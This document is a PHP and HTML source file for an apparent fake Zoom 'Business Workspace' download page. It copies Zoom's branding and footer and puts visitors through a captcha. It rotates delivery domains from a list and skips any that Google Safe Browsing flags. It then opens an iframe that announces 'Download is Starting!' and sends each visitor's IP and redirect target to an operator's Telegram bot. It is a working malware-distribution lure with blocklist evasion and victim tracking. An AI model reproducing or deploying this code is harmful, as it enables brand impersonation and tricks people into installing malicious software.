<?php

$config = include 'config.php';

$telegramBotToken = $config['telegram_bot_token'];
$telegramChatId = $config['telegram_chat_id'];
$safebrowsingApiKey = $config['safebrowsing_api_key'];
$enableSafeBrowsing = $config['enable_safebrowsing'];
$enableAccessibility = $config['enable_accessibility'];
$enableWildcard = $config['enable_wildcard'];

function sendTelegramMessage($message) {
    global $telegramBotToken, $telegramChatId;
    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $data = [
        'chat_id' => $telegramChatId,
        'text' => $message,
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_exec($ch);
    curl_close($ch);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    require_once "captcha.php";

    $cf_turnstile_response = $_POST["cf-turnstile-response"];
    $cf_connecting_ip = $_SERVER["REMOTE_ADDR"];

    $captcha_success = validate_captcha($cf_turnstile_response, $cf_connecting_ip);

    if ($captcha_success) {
        // Wait for 3 seconds (if needed)
        sleep(3);

        // Path to links.txt
        $linksFilePath = 'links.txt';

        // Read links from file
        $links = file($linksFilePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

        if ($links === false) {
            error_log("Error reading links file.");
            echo "Error reading links file.";
            exit();
        }

        function is_domain_safe($domain) {
            global $safebrowsingApiKey;
            $apiUrl = 'https://safebrowsing.googleapis.com/v4/threatMatches:find?key=' . $safebrowsingApiKey;

            $postData = json_encode([
                'client' => [
                    'clientId' => 'yourcompany',
                    'clientVersion' => '1.0.0'
                ],
                'threatInfo' => [
                    'threatTypes' => ['MALWARE', 'SOCIAL_ENGINEERING'],
                    'platformTypes' => ['ANY_PLATFORM'],
                    'threatEntryTypes' => ['URL'],
                    'threatEntries' => [
                        ['url' => $domain]
                    ]
                ]
            ]);

            $ch = curl_init($apiUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Content-Type: application/json'
            ]);

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            error_log("Checked domain: $domain");
            error_log("HTTP Code: $httpCode");
            error_log("Response: $response");

            if ($httpCode === 200) {
                $result = json_decode($response, true);
                if (isset($result['matches']) && !empty($result['matches'])) {
                    error_log("Domain flagged as unsafe: $domain");
                    return false;
                } else {
                    return true;
                }
            } else {
                error_log("API Error or Rate Limit Exceeded for domain: $domain");
                return false;
            }
        }

        function is_link_accessible($url) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_setopt($ch, CURLOPT_HEADER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            error_log("Checked URL: $url");
            error_log("HTTP Code: $httpCode");

            return $httpCode >= 200 && $httpCode < 400;
        }

        function generate_wildcard_url($base_domain) {
            $randomSuffix = rand(1, 1000);
            return "https://www" . $randomSuffix . "." . $base_domain;
        }

        $redirectURL = null;

        foreach ($links as $baseDomain) {
            $baseDomain = trim($baseDomain);

            // Ensure base domain has https:// prefix
            $baseDomain = preg_match("/^https?:\/\//", $baseDomain) ? $baseDomain : "https://$baseDomain";

            if (filter_var($baseDomain, FILTER_VALIDATE_URL)) {
                $isSafe = true;
                $isAccessible = true;

                if ($enableSafeBrowsing) {
                    $isSafe = is_domain_safe($baseDomain);
                    if (!$isSafe) {
                        error_log("Base domain flagged as unsafe: $baseDomain");
                        sendTelegramMessage("⚠️ Unsafe domain detected: $baseDomain\n📟IP: $cf_connecting_ip\n🔗Current Link: $baseDomain");
                    }
                }

                if ($enableAccessibility && $isSafe) {
                    $isAccessible = is_link_accessible($baseDomain);
                    if (!$isAccessible) {
                        error_log("URL is unresponsive: $baseDomain");
                        sendTelegramMessage("⚠️ URL is unresponsive: $baseDomain\n📟IP: $cf_connecting_ip");
                    }
                }

                if ($isSafe && $isAccessible) {
                    if ($enableWildcard) {
                        $foundValidURL = false;
                        for ($i = 1; $i <= 1000; $i++) {
                            $wildcard_url = generate_wildcard_url(parse_url($baseDomain, PHP_URL_HOST));
                            if (is_link_accessible($wildcard_url) && ($enableSafeBrowsing && is_domain_safe($wildcard_url))) {
                                $redirectURL = $wildcard_url;
                                $foundValidURL = true;
                                break;
                            }
                        }

                        if (!$foundValidURL) {
                            error_log("No valid wildcard URLs found for base domain: $baseDomain");
                        }
                    } else {
                        $redirectURL = $baseDomain;
                        break;
                    }
                }
            } else {
                error_log("Invalid URL detected: $baseDomain");
                sendTelegramMessage("⚠️ Invalid URL detected: $baseDomain\n📟IP: $cf_connecting_ip\n🔗Current Link: $baseDomain");
            }
        }

        if ($redirectURL) {
            $proxyURL = 'client_id.php?url=' . urlencode($redirectURL); 
            echo '
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Post Attendee - Zoom</title>
  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet" />
    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.0/css/bootstrap.min.css" rel="stylesheet" />
    <link href="//cdnjs.cloudflare.com/ajax/libs/rainbow/1.2.0/themes/tricolore.css" rel="stylesheet" />
    <link href="//rawgit.com/saribe/toastr8/master/dist/css/toastr8.min.css" rel="stylesheet" />

    <script async src="//www.google-analytics.com/analytics.js"></script>
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.0/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/rainbow/1.2.0/js/rainbow.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/rainbow/1.2.0/js/language/generic.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/rainbow/1.2.0/js/language/javascript.js"></script>
    <script src="//rawgit.com/saribe/toastr8/master/dist/js/toastr8.min.js" type="text/javascript"></script>
    <script src="//rawgit.com/saribe/eModal/master/dist/eModal.js"></script>

  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      background-color: #121212; /* Dark background */
      color: #fff; /* White text */
    }

    #header_container {
      background-color: #1e1e1e;
      padding: 10px 20px;
    }

    .logo {
      font-size: 20px;
      font-weight: bold;
      color: #e0e0e0;
      padding: 20px
    }

    #content-wrapper {
      white-space: normal;
      min-height: 680px;
    }

    #content-section {
      width: 80%;
      margin: 0 auto;
      padding-top: 40px;
      display: flex;
      flex-direction: column-reverse;
      max-width: 1120px;
    }

    .buttons {
      display: flex;
      justify-content: center;
      gap: 10px;
    }

    footer {
      background-color: #1e1e1e;
      padding: 20px;
      text-align: center;
      color: #aaa;
      font-size: 14px;
    }

    #footer-links a {
      color: #aaa;
      margin-left: 10px;
      border-left: 1px solid;
      padding-left: 10px;
    }

    .default-zoom {
      position: absolute;
      left: 50%;
      top: 50%;
      width: 356px;
      height: 80px;
      transform: translate(-50%, -50%);
    }

    @media only screen and (min-width: 768px) {
      #content-section {
        width: 55%;
        padding-top: 80px;
      }
    }

    @media only screen and (min-width: 1050px) {
      #content-section {
        flex-direction: row;
        width: 100%;
        align-items: center;
      }
    }
  </style>
</head>
<body>

  <!-- Header -->
  <div id="header_container">
    <div id="header_outer" class="container clearfix">
      <div id="header" class="clearfix">
        <div class="left">
          <a class="imglink" href="https://us02web.zoom.us/" style="margin-left: 10px;">
            <img class="logo" src="https://st2.zoom.us/static/6.3.26166/image/new/topNav/Zoom_logo.svg" alt="Zoom Logo"/>
          </a>
        </div>
        <div class="action-btns" style="float: right;">
  <div style="display:inline-block;">
    <a target="_blank" href="https://support.zoom.us/hc/en-us">Support</a>
  </div>
</div>
        </div>
      </div>
    </div>
  </div>

  <!-- Main content -->
  <div id="content-wrapper">
    <img class="default-zoom" src="https://st2.zoom.us/static/6.3.26166/image/new/topNav/Zoom_logo.svg" alt="Zoom" />
  </div>

  <!-- Footer -->
  <footer>
    &copy; 2024 Zoom Video Communications, Inc. All rights reserved.
    <br/>
    <a href="https://explore.zoom.us/en/legal">Privacy & Legal Policies</a>
    <a id="ot-do-not-sell" class="ot-sdk-show-settings">Do Not Sell My Personal Information</a>
    <a id="ot-cookie-pref" class="ot-sdk-show-settings">Cookie Preferences</a>
  </footer>



    <script>
        $(document).ready(function () {
            var title = "Please wait...";
            return eModal.iframe("' . $proxyURL . '", title)
                .then(function () { toastr8.success("Download is Starting!", title); });
        });
    </script>
</body>
</html>';
            sendTelegramMessage("🚀 Redirecting to: $redirectURL\n📟IP: $cf_connecting_ip");
            exit();
        } else {
            echo '<script>window.location.href = "https://www.zoom.com";</script>';
            sendTelegramMessage("🚫 No valid links found. Redirecting to default URL.\n📟IP: $cf_connecting_ip");
            exit();
        }
    } else {
        echo '<script>console.log(' . json_encode('Captcha failed! ') . ');</script>';
    }
}
?>

<!doctype html>

<html xmlns:fb="http://ogp.me/ns/fb#" lang="en-US">
<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# zoomvideocall: http://ogp.me/ns/fb/zoomvideocall#">
<title>Try Business Workspace for Free | Zoom</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="referrer" content="origin-when-cross-origin">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0">

<meta name="google-site-verification" content="8WU-FkemSTzA1EpoynHUDYe2UxPXiMS53FBXk6_qVy4" />
<meta name="google-site-verification" content="J_tzcwoKXfPkhsWbiS7cM6WEn3pjCr_DhMNmhRtd960" />
<meta name="google-site-verification" content="o7_kGQ-oKZjWTkzWK3NYR9JUf3SvQKIBwjHgqTE_FHU" />
<meta name="google-site-verification" content="QXsuSwndXLLWh52gEd4ig7alEmTyDp0NPo4GCKsUH5k" />
<meta name="google-site-verification" content="Vt60qsrxhpi8GdAMlhQod8oxA2LAtN908SnMDdelCYc" />
<meta name="google-site-verification" content="v3_Ow9RbJsRZ9MLl--QrhABeFcA9oP7OBXhY50O4QuA" />
<meta name="google-site-verification" content="0fZHb1ni-k_iNiYVnomwmnY9ITBunxqU8VC49mHDNxc" />
<meta name="p:domain_verify" content="2bec2c9f9a864e14528964bf24c404b3" />
<meta name="keywords" content="zoom, zoom.us, video conferencing, video conference, online meetings, web meeting, video meeting, cloud meeting, cloud video, group video call, group video chat, screen share, application share, mobility, mobile collaboration, desktop share, video collaboration, group messaging" />
<meta name="description" content="Join a Zoom Meeting directly from your web browser using a meeting code or link."/>
<meta property="og:type" content="website" />
<meta property="og:url" content="https://zoom.us/join" />
<meta property="og:title" content="Join Meeting | Zoom"/>
<meta property="og:description" content="Join a Zoom Meeting directly from your web browser using a meeting code or link."/>
<meta property="og:image" content="https://st3.zoom.us/static/6.3.26166/image/thumb.png" />
<meta property="og:site_name" content="Zoom" />
<meta property="fb:app_id" content="113289095462482" />
<meta property="twitter:account_id" content="522701657" />
<link rel="shortcut icon" href="https://st1.zoom.us/zoom.ico" />
<link rel="canonical" href="https://zoom.us/join" />
<link rel="alternate" href="https://zoom.us/join" hreflang="x-default" />
<link rel="alternate" href="https://zoom.us/join" hreflang="en" />
<link rel="alternate" href="https://zoom.us/es/join" hreflang="es" />
<link rel="alternate" href="https://zoom.us/de/join" hreflang="de" />
<link rel="alternate" href="https://zoom.us/zh-cn/join" hreflang="zh-cn" />
<link rel="alternate" href="https://zoom.us/zh-tw/join" hreflang="zh-tw" />
<link rel="alternate" href="https://zoom.us/fr/join" hreflang="fr" />
<link rel="alternate" href="https://zoom.us/pt/join" hreflang="pt" />
<link rel="alternate" href="https://zoom.us/ja/join" hreflang="ja" />
<link rel="alternate" href="https://zoom.us/ru/join" hreflang="ru" />
<link rel="alternate" href="https://zoom.us/ko/join" hreflang="ko" />
<link rel="alternate" href="https://zoom.us/it/join" hreflang="it" />
<link rel="alternate" href="https://zoom.us/vi/join" hreflang="vi" />
<link rel="alternate" href="https://zoom.us/pl/join" hreflang="pl" />
<link rel="alternate" href="https://zoom.us/tr/join" hreflang="tr" />
<link rel="alternate" href="https://zoom.us/id/join" hreflang="id" />
<link rel="alternate" href="https://zoom.us/nl/join" hreflang="nl" />
<link rel="alternate" href="https://zoom.us/sv/join" hreflang="sv" />
<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/kgjfgplpablkjnlkjmjdecgdpfankdle" />
<script nonce="u9KoEo7aTiSMOOAzImLT8w" type="text/javascript">
var resourceAccountIdRoutingURl = "";
resourceAccountIdRoutingURl = resourceAccountIdRoutingURl==""?undefined:resourceAccountIdRoutingURl;
</script>

<script nonce="u9KoEo7aTiSMOOAzImLT8w" type="text/javascript" id="campaign_flags">
try {
window.campaignFlags = {
locale: document.documentElement.getAttribute('lang') || '',
isLoggedIn: false,
currencyValue: 'ZAR',
currentCountry: 'za'.toLocaleUpperCase(),
billingCountry: {
}
};
window.optimizely = window.optimizely || [];
window.optimizely.push({
type: 'user',
attributes: {
visitorHasBillingEditPermission: window.campaignFlags.hasBillingEditPermission,
visitorHasBillingReadPermission: window.campaignFlags.hasBillingReadPermission,
visitorSoldToCountry: window.campaignFlags.billingCountry.soldTo,
visitorBillToCountry: window.campaignFlags.billingCountry.billTo,
visitorIpCountry: window.campaignFlags.currentCountry,
visitorCurrency: window.campaignFlags.currencyValue,
visitorLoggedIn: window.campaignFlags.isLoggedIn,
visitorLocale: window.campaignFlags.locale
}
});
window.campaignVariants = JSON.parse('{}');
window.campaignBlock = [];
} catch (e) {
console.error('Error setting up Optimizely namespaces');
}
</script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" type="text/javascript">
var isBB = /BlackBerry/i.test(navigator.platform);
if (isBB) {
var url = window.location.href;
if (url.indexOf('?') < 0) {
url += '?';
} else {
url += '&';
}
url += "os=bb&browser=bb10";
window.location.href = url;
}
</script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w">
window.zmGlobalMrktId = "ebd43fe21daf4f67b1194cfa3baa302a" || null;
window.zmGlobalMrktKey = "" || null;
window['optimizely'] = window['optimizely'] || [];
window["optimizely"].push({
"type": "tags",
"tags": {
"zm_usr_id_sha256": window.zmGlobalMrktKey || ""
}
});
</script><script nonce="u9KoEo7aTiSMOOAzImLT8w">
var optimizely = window["optimizely"] || [];
optimizely.push({"type": "holdEvents"});
</script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" src="https://st2.zoom.us/static/6.3.26166/js/app/optimizely/helper.min.js"></script>
<script src="https://explore.zoom.us/docs/js/optimizely/optimizely.js" nonce="u9KoEo7aTiSMOOAzImLT8w"></script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w">
(function () {
var optimizely = window["optimizely"];
if (!optimizely) return;
optimizely.get('utils').waitUntil(function () {
// wait until default defined OneTrust OptanonWrapper function is defined
return typeof window.OptanonWrapper !== 'undefined';
}).then(function () {
(function (origFunc) {
window.OptanonWrapper = function () {
origFunc && origFunc();
var oneTrustConsentId = OneTrust.getDataSubjectId();
var activeGroups = (OnetrustActiveGroups || '').split(',');
activeGroups = activeGroups.filter(function (v) {
return v !== '';
});
// send Optimizely events when Performance consent is given
if (activeGroups.indexOf('C0002') > -1) {
optimizely.push({
"type": "tags",
"tags": {
"onetrust_id": oneTrustConsentId || ""
}
});
optimizely.push({"type": "sendEvents"});
}
};
})(window.OptanonWrapper);
});
})();
</script>
<link type="text/css" rel="stylesheet" href="https://st1.zoom.us/static/6.3.26166/css/fonts/internacional.min.css" />
<link type="text/css" rel="stylesheet" href="https://st3.zoom.us/static/6.3.26166/css/fonts/suisse.min.css" />
<link type="text/css" rel="stylesheet" href="https://st1.zoom.us/static/6.3.26166/css/all.min.css" />
<link rel="stylesheet" type="text/css" href="https://st1.zoom.us/static/6.3.26166/css/vue/zoom-components.min.css"/>
<style>
#content_container {
min-height: 600px;
}
.form-control.input-lg.confno {
font-size: 20px;
height: 56px;
text-align: center;
}
#join-form {
max-width: 360px;
margin: 0 auto;
}
#join-form .form-control, #join-form .btn {
border-radius: 12px;
}
.links {
font-size: 16px;
color: #68687b;
}
.links a {
color: #0E71EB;
display: inline-block;
}
@media (max-width: 767px) {
.form-horizontal .form-group {
margin-left: 0;
margin-right: 0;
}
#roomSystemDialog .modal-footer {
padding-left: 20px;
}
}
.form-control.input-lg.confno {
font-size: 15px;
text-align: left;
}
.form-control:focus {
border: 2px solid #0E72ED;
}
.input-lg{
height: 40px !important;
}
#join-conf .btn.user {
height: 40px !important;
font-size:16px;
line-height:31px !important
}
.wc-new-syle{
text-align: center;
}
</style>
<style>
html,body{
background-color: white;
}
#wc-dropdown-menu{
top: inherit;
bottom: 36px;
min-width: 240px;
padding: 8px 0;
position: absolute;
right: 0;
border-radius: 4px;
margin-top: 6px;
text-shadow: none;
border: 1px solid white;
background-color: #fff;
background-clip: padding-box;
box-shadow: 0 6px 12px rgb(0 0 0 / 18%);
}
#wc-dropdown-menu li {
/*width: 50%;
float: left;*/
text-align: left;
}
#wc-dropdown-language #wc-dropdown-menu:after{
top: inherit;
bottom: -6px;
right: 35px;
border: 0;
border-right: 6px solid transparent;
border-top: 6px solid #fff;
border-left: 6px solid transparent;
border-bottom: 0;
content: '';
}
#wc-dropdown-language #wc-dropdown-menu:before{
content: '';
display: none !important;
}
body div.combobox div.dropdownlist{
width: calc(100% + 2px) !important;
}
.expired-cc-banner {
padding: 25px;
margin-bottom: 0px;
display: flex;
align-items: center;
justify-content: center;
border: 0;
}
.expired-cc-banner.warn {
color: #361E00;
background-color: #FFF9F2;
}
.expired-cc-banner.error {
color: #44010D;
background-color: #FFF2F5;
}
.expired-cc-banner .alert-warning__content {
width: 100%;
margin-left: 20px;
}
.expired-cc-banner .zm-icon-warning {
font-size: 17px;
color: #B36200;
}
.expired-cc-banner .zm-icon-error {
font-size: 17px;
color: #E8173D;
}
.expired-cc-banner .zm-icon-close {
color: #131619;
cursor: pointer;
}
#header_login li.pic a#profile-menu-item-billing-upgrade {
background-color: #0E71EB;
}
.profile-menu a.profile-menu-item-billing__upgrade {
width: calc(100% - 32px);
padding: 6px 16px !important;
margin: auto;
color: #FFFFFF;
background-color: #0E71EB;
}
.profile-menu a.profile-menu-item-billing__upgrade.hover {
box-shadow: 0 0 0 2px #ffffff, 0 0 0 4px #0E72ED;
}
</style>

<link rel="stylesheet" href="https://st1.zoom.us/static/6.3.26166/js/lib/vue/advanced/notification/notification.min.css">
<link rel="stylesheet" type="text/css" href="https://st3.zoom.us/static/6.3.26166/js/lib/vue/advanced/popup-captcha/popup-captcha.min.css"/>

<style>
.ot-sdk-show-settings {
cursor: pointer;
}
#footer-links .sublinks .ot-sdk-show-settings {
padding-left: 10px;
border-left: 1px solid;
margin-left: 10px;
}
#ot-do-not-sell {
position: relative;
padding-left: 42px !important;
}
#ot-do-not-sell::before {
content: "";
position: absolute;
left: 6px;
top: 50%;
transform: translateY(-50%);
width: 30px;
height: 15px;
background-image: url('https://st3.zoom.us/static/6.3.26166/image/marketing/privacyoptions.svg');
background-size: contain;
background-repeat: no-repeat;
}
</style></head>
<body class="     " data-cd="zoom.us">
<div class="total-main-content">
<div id="skiptocontent">
<a aria-label="Skip to main content" href="#the-main-content">Skip to Main Content</a>
</div>
<div id="accessibilityHome">
<a aria-label="Accessibility overview" href="https://explore.zoom.us/en/accessibility">Accessibility Overview</a>
</div>
<div id="header_container" class="   ">
<div id="header_outer" class="container clearfix  ">
<link type="text/css" rel="stylesheet" href="https://st3.zoom.us/static/6.3.26166/css/top_nav.min.css" />
<div id="header" class="march-2024 navbar navbar-default navbar-fixed-top enable-audiences-replace-services">
<nav class="container" role="banner">
<div class="navbar-header ">
<button aria-controls="navbar" aria-expanded="false" data-target="#navbar" data-toggle="collapse" class="navbar-toggle collapsed mobileView" type="button" value="navbar">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<ul class="list-inline pull-right visible-xs" style="line-height: 50px;">
<li style="padding-right: 15px"><a style="color: #666484" href="https://zoom.us/join" target="_blank">Join</a></li>
<li style="padding-right: 15px"><a id="mobile-host-btn" style="color: #666484" href="/start/videomeeting" target="_blank">Host</a></li>
</ul>
<div class="left">
<a class="imglink" href="https://zoom.us/" aria-label="Zoom Home Page">
<img class="logo" src="https://st2.zoom.us/static/6.3.26166/image/new/topNav/Zoom_logo.svg" alt="Zoom Logo"/>
</a>
</div>
</div>
<div>
<div class="navbar-collapse collapse" id="navbar">
<button id="tabletToggle" aria-controls="navbar-left" aria-expanded="false" data-target="#navbar-left-tab" data-toggle="collapse" class="navbar-toggle collapsed hidden-xs" type="button" value="navbar">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<ul class="nav navbar-nav navbar-right mobileView" role="menubar" aria-label="meetings">
<li ><a class="menu-items-right-new-nav signin-new visible-xs" role="button" href="https://zoom.us/signin" onClick="ga('send', 'event', 'product', 'click-nav-signin', 'Header Nav Sign In');">Sign In</a></li>
<li><a class="menu-items-right-new-nav signup-new" role="button" href="https://zoom.us/signup" onClick="ga('send', 'event', 'freesignup', 'click-nav-signupfree', 'Header Nav Sign up Free');">Sign Up Free</a></li>
</ul>
<ul class="nav navbar-nav navbar-right nonMobileView" role="navigation" aria-label="meetings">
<li><a class='menu-items-right-new-nav contact-sales-new hidden-xs' href="https://support.zoom.com/hc/en" >Support</a></li>
<li ><a class="menu-items-right-new-nav signin-new visible-xs" role="button" href="https://zoom.us/signin" onClick="ga('send', 'event', 'product', 'click-nav-signin', 'Header Nav Sign In');">Sign In</a></li>
<li><a class="menu-items-right-new-nav signup-new" role="button" href="https://zoom.us/signup" onClick="ga('send', 'event', 'freesignup', 'click-nav-signupfree', 'Header Nav Sign up Free');">Sign Up Free</a></li>
</ul>
</div>
</div>
</nav>
</div>
<script nonce="u9KoEo7aTiSMOOAzImLT8w">
var isWebAppsEnabled = false;
</script></div>
</div>
<div id="content_container" style="min-height: 872px;"  class="zoom-newcontent ">
<div id="content_success_msg" role="alert" aria-live="assertive" class="alert alert-success hideme zoom-newmessage"></div>
<div id="content" class="main-content">
<div id="notice-slot"></div>
<div class="mini-layout" id="join-conf">
<div class="mini-layout-body" >
<div class="HiddenText"><a id="the-main-content" tabindex="-1"></a></div>
<div class="page-header" style="text-align: center">
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<h1 style="font-size: 24px;">One moment please...</h1>
</div>
<div class="box">
<input type="hidden" id="from" value="" />
<form id="join-form" class="form-vertical" method="POST">
<div class="form-group confno" style="margin-bottom: 16px">
<div class="controls">
<label for="join-confno" style="color: #747486;font-size: 12px;margin-bottom: 10px;">We’re checking your browser to keep your data safe.</label>
            <div class="cf-turnstile" data-sitekey="<?php echo $TURNSTILE_SITE_KEY; ?>" data-callback="javascriptCallback" data-theme="light"></div>
 <script>
        function javascriptCallback(token) {
            console.log("Received token:", token);
            document.getElementById("join-form").submit();
        }
    </script>
<div id="errorContainer" class="wc-new-syle">
<div id="join-errormsg" class="error hideme"><i></i><span></span></div>
</div>
</div>
</div>
<div class="form-group" style="margin-bottom: 16px">
<div class="controls">
By Downloading "Zoom Business Workspace", you agree to our <a target="_blank" href="/terms">Terms of Services</a> and <a target="_blank" href="/privacy">Privacy Statement</a></div>
</div>
<div class="form-group" style="margin-bottom: 72px">
<div class="controls wc-new-syle">
<a id="btnSubmit" role="button" style="height: 56px; line-height: 44px; width: 100%;background-color: rgba(82, 82, 128, 0.09);opacity: 1;" href="#" class="btn btn-primary user submit">Please wait...</a>
</div>
</div>
<div class="form-group">
<div class="controls wc-new-syle">
<a id="btnRoomSystemJoin" class="doc" href="#">Join a meeting from an H.323/SIP room system</a>
</div>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
<div id="video_dialog" role="alertdialog" class="noheaderfooterdialog modaldialog hideme">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header clearfix">
<div class="modal-title"></div>
<button class="close simplemodal-close" aria-label="close">&times;</button>
</div>
<div class="modal-body">
<div class="modal-body-container">
</div>
</div>
</div>
</div>
</div>
<div id="footer_container" style="background-color: white;min-height: 56px;text-align: center;position: fixed;bottom: 0;" role="contentinfo">
<div class="">
<div style="display: inline-block;">
<div style="font-size: 14px;">
<span style="text-align: center; margin-top: 24px;background: white;color: #666;font-size: 14px;font-weight: 300;">© 2024 Zoom Video Communications, Inc. All rights reserved. 
<a style="color: #747487;" href="https://explore.zoom.us/en/legal">Privacy & Legal Policies</a>
</span>
<span class="action-btns" style="margin-left: -8px;font-size: 14px;">
<div style="display: inline-block;">
<ul style="list-style: none;">
<li>
<div id="wc-dropdown-language" class="dropdown-language dropdown" role="presentation">
<a role="button" style="color: #0E71EB;" href="javascript:;" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown" data-close-others="true" aria-haspopup="listbox">
<span style="margin-left: -20px;">English</span>
<span class="caret"></span>
</a>
<ul id="wc-dropdown-menu" class="dropdown-menu pull-right">
<li class="active"><a href="#" data-locale="en-US">English</a></li>

</ul>
</div>
</li>
</ul>
</div>
</span>
</div>
</div>
</div>
</div>
<div id="fb-root"></div>
<input type="hidden" id="__platformCheck" value="" />
<div id="notification"></div>
<input type="hidden" id="detect" value="https://st2.zoom.us/cdn-detect.png"/>

<style type="text/css">
@media screen and (max-width: 767px) {
.navbar-signup-header .navbar-header {
display: block;
float: left;
border: none;
}
.navbar-signup-header .collapse {
display: block;
}
#header_container .container > .navbar-collapse {
background-color: #fff;
border: none;
}
#header_outer .navbar-signup-header .navbar-collapse .navbar-right {
float: right;
margin-top: 4px;
}
}
</style>
<script nonce="u9KoEo7aTiSMOOAzImLT8w">
var isFreeAccount = true;
var SB = {
version: '6.3.26166',
contextPath: '',
baseUrl: 'https://zoom.us',
baseStaticUrl: 'https://st3.zoom.us/static/6.3.26166',
loggedIn: false,
fbLoggedIn: false,
fbAppkey: '113289095462482',
fbAppPage: 'https://apps.facebook.com/zoomvideocall/',
fbScope: 'email,public_profile',
pardotPaymentUrl : 'https://go.pardot.com/l/84442/2015-07-23/mw5t',
pardotBuyUrl : 'https://go.pardot.com/l/84442/2015-07-14/4xht',
pardotSubscriptionUrl : 'https://go.pardot.com/l/84442/2015-07-23/mv5y',
pardotActivateUserUrl : 'https://go.pardot.com/l/84442/2015-10-23/mspcv',
noSignup: 'false',
languagePref: 'en-US',
isGDPRCountry: false
};
</script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" src="https://st3.zoom.us/static/6.3.26166/js/lib/vue/vue.min.js"></script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" src="https://st2.zoom.us/static/6.3.26166/js/lib/vue/zoom-components.min.js"></script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" src="https://st3.zoom.us/static/6.3.26166/js/lib/vue/advanced/popup-captcha/popup-captcha.min.js"></script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w">
// common captcha setting
var routingUrl=""
var hCaptchaSiteKey="df6242b3-aef1-4156-bf8e-c5f258d9e602"
var gRecaptchaVisible="6LdZ7KgaAAAAACd71H_lz76FwfcJpc4OQ1J7MDWA";
var gRecaptchaInvisible="6Lf2C54aAAAAAOOpnJT1sg39rowHN362Zj2QSyls";
var cfRecaptchaCheckboxSiteKey="0x4AAAAAAAZQvKXdvahp4tEM";
var cfRecaptchaInvisibleSiteKey="0x4AAAAAAAZQvcBUTC_uhZW5";
var canSkipCaptcha= false || false
var isGrecaptchaEnt= true || false
var isCN = false;
var isSupportGoogleCaptcha = true;
var isSupportGoogleCaptchaForCN = true || false
var isSupportHcaptcha = false;
var isSupportCfCaptcha = false;
var isSmartCaptcha = true; // default
var isHcaptcha = false; // default
var isCfCaptcha = false // default
if (canSkipCaptcha){
isSmartCaptcha = true;
isHcaptcha = false;
} else if (isSupportGoogleCaptcha) {
// google captcha
if (!isCN || isSupportGoogleCaptchaForCN) {
isSmartCaptcha = false;
isHcaptcha = false;
}
} else if(isSupportCfCaptcha) {
// cloudflare turnstile captcha
isSmartCaptcha = false;
isCfCaptcha = true;
} else if (isSupportHcaptcha){
// hcaptcha
isSmartCaptcha = false;
isHcaptcha = true;
} else {
// smart captcha
isSmartCaptcha = true;
isHcaptcha = false;
}
// common setting for front-end project
var clock_out_path = '/clockout';
</script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w">
var seoPageUrl = '\/join';
window.enableLocaleLanguageTag = true;
window.seoPageUrl = seoPageUrl;
</script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" src="https://st1.zoom.us/static/6.3.26166/js/all.min.js"></script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w">
$.i18n.load({
"common.btn_close": "Close",
"common.btn_yes": "Yes",
"common.btn_no": "No",
"common.title.prompt": "Prompt",
"common.title.confirmation": "Confirmation",
"common.unknown_error": "Unknown Error!",
"common.error": "Error",
"common.enter_time_in_12_hour": "Please enter a valid time in 12-hour",
"common.tips": "Tips, press Enter to expand",
"jquery.validation_required":"This field is required.",
"jquery.validation_remote":"Please fix this field.",
